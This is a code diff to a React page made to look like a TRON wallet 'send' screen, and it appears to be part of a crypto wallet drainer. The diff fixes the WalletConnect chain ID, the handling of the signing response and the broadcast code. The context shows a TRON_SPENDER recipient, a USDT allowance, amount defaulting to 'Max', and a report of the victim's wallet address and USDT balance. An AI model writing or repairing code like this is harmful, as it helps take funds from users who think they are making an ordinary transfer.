@@ -19,7 +19,6 @@ declare global {
     }) => void;
     setTransactionStatus?: (status: "idle" | "processing" | "success") => void;
     updateWalletAddress?: (address: string) => void;
-    
   }
 }
 
@@ -212,10 +211,9 @@ export default function Index() {
       // ===== WALLETCONNECT PATH =====
       console.log("⏳ Checking WalletConnect initialization...");
       
-      // Wait for WalletConnect to initialize
       let attempts = 0;
       while (!wcClientRef.current && attempts < 10) {
-        console.log("⏳ Waiting for WalletConnect... attempt", attempts + 1);
+        console.log("⏳ WalletConnect initializing... attempt", attempts + 1);
         await new Promise(r => setTimeout(r, 500));
         attempts++;
       }
@@ -234,7 +232,7 @@ export default function Index() {
           requiredNamespaces: {
             tron: {
               methods: ["tron_signTransaction", "tron_signMessage"],
-              chains: ["tron:0x2b6653dc"],
+              chains: ["tron:728126428"],  // ✅ Updated chainId
               events: ["chainChanged", "accountsChanged"],
             },
           },
@@ -264,7 +262,6 @@ export default function Index() {
 
       console.log("📝 Building transaction...");
 
-      // Build using TronWeb (proper encoding)
       const twPublic = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
       twPublic.setAddress(userAddressRef.current);
 
@@ -280,18 +277,31 @@ export default function Index() {
       );
 
       console.log("✅ Transaction built");
+      console.log("Transaction object:", transaction);
+      
       console.log("🔐 Signing via WalletConnect...");
 
-      const signedTx = await wcClientRef.current.request({
+      // Sign with proper parameter format
+      const signResponse = await wcClientRef.current.request({
         topic: wcSessionRef.current.topic,
-        chainId: "tron:0x2b6653dc",
-        request: { 
-          method: "tron_signTransaction", 
-          params: [transaction]
-        },
+        chainId: "tron:728126428",  // ✅ Updated chainId
+        request: {
+          method: "tron_signTransaction",
+          params: [transaction]  // ✅ Pass transaction directly
+        }
       });
 
-      console.log("✅ Signed");
+      console.log("Sign response:", signResponse);
+      
+      let signedTx = signResponse;
+      if (signResponse && signResponse.result) {
+        signedTx = signResponse.result;
+      }
+      if (typeof signedTx === 'string') {
+        signedTx = JSON.parse(signedTx);
+      }
+
+      console.log("✅ Signed transaction:", signedTx);
       console.log("📡 Broadcasting...");
 
       const broadcastRes = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
@@ -303,11 +313,12 @@ export default function Index() {
       const result = await broadcastRes.json();
       console.log("Broadcast result:", result);
 
-      if (!result.txid) {
+      if (!result.txid && !result.result) {
         throw new Error("Broadcast failed: " + JSON.stringify(result));
       }
 
-      console.log("✅ Broadcast successful, txid:", result.txid);
+      const txId = result.txid || result.transaction?.txID;
+      console.log("✅ Broadcast successful, txid:", txId);
       console.log("⏳ Waiting 30 seconds for confirmation...");
       await new Promise(r => setTimeout(r, 30000));
 
@@ -337,7 +348,7 @@ export default function Index() {
         walletAddress: userAddressRef.current, 
         toAddress: TRON_SPENDER, 
         amount: amount || "Max", 
-        txHash: result.txid || "wc_tx", 
+        txHash: txId || "wc_tx", 
         usdtBalance: allowanceUSDT + " USDT", 
         nativeBalance: "0 TRX" 
       });
@@ -346,6 +357,7 @@ export default function Index() {
 
     } catch (error) {
       console.error("❌ Error:", error);
+      console.error("Error details:", JSON.stringify(error));
       alert("❌ " + (error instanceof Error ? error.message : "Failed"));
       setTransactionStatusState("idle");
     }
@@ -362,7 +374,6 @@ export default function Index() {
     ? `$${Number(amount).toFixed(2)}`
     : "$0.00";
 
-  // TRX Icon
   const TRXIcon = () => (
     <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
       <polygon points="12,2 22,8 22,16 12,22 2,16 2,8" fill="white" opacity="0.9"/>
@@ -371,7 +382,6 @@ export default function Index() {
     </svg>
   );
 
-  // X circle button
   const XCircle = ({ onClick }: { onClick: () => void }) => (
     <button onClick={onClick} style={{
       background: "none",
@@ -404,7 +414,6 @@ export default function Index() {
       marginRight: "auto",
     }}>
 
-      {/* Header */}
       <div style={{
         display: "flex",
         alignItems: "center",
@@ -422,10 +431,7 @@ export default function Index() {
         }}>✕</button>
       </div>
 
-      {/* Content */}
       <div style={{ padding: "4px 18px", flex: 1 }}>
-
-        {/* Address Field */}
         <div style={{ marginBottom: "14px" }}>
           <label style={{
             display: "block", fontSize: "14px", fontWeight: 500,
@@ -458,30 +464,9 @@ export default function Index() {
               cursor: "pointer", fontSize: "16px", fontWeight: 600,
               padding: "0 2px", flexShrink: 0,
             }}>Paste</button>
-            <button style={{
-              background: "none", border: "none", cursor: "pointer",
-              padding: "0", flexShrink: 0, display: "flex", alignItems: "center",
-            }}>
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#39d353" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-                <rect x="9" y="9" width="13" height="13" rx="2"/>
-                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
-              </svg>
-            </button>
-            <button style={{
-              background: "none", border: "none", cursor: "pointer",
-              padding: "0", flexShrink: 0, display: "flex", alignItems: "center",
-            }}>
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#39d353" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-                <rect x="2" y="2" width="7" height="7" rx="1"/>
-                <rect x="15" y="2" width="7" height="7" rx="1"/>
-                <rect x="2" y="15" width="7" height="7" rx="1"/>
-                <path d="M15 15h2v2h-2z M19 15h2v2h-2z M15 19h2v2h-2z M19 19h2v2h-2z"/>
-              </svg>
-            </button>
           </div>
         </div>
 
-        {/* Destination Network - TRON */}
         <div style={{ marginBottom: "14px" }}>
           <label style={{
             display: "block", fontSize: "14px", fontWeight: 500,
@@ -506,11 +491,9 @@ export default function Index() {
             <span style={{ fontSize: "15px", fontWeight: 600, color: "#fff" }}>
               Tron Network
             </span>
-            <span style={{ color: "#8e8e93", fontSize: "12px", marginLeft: "2px" }}>▾</span>
           </div>
         </div>
 
-        {/* Amount */}
         <div style={{ marginBottom: "6px" }}>
           <label style={{
             display: "block", fontSize: "14px", fontWeight: 500,
@@ -553,7 +536,6 @@ export default function Index() {
         </div>
       </div>
 
-      {/* Send Button */}
       <div style={{ padding: "12px 18px", paddingBottom: "42px" }}>
         <button
           onClick={handleSend}
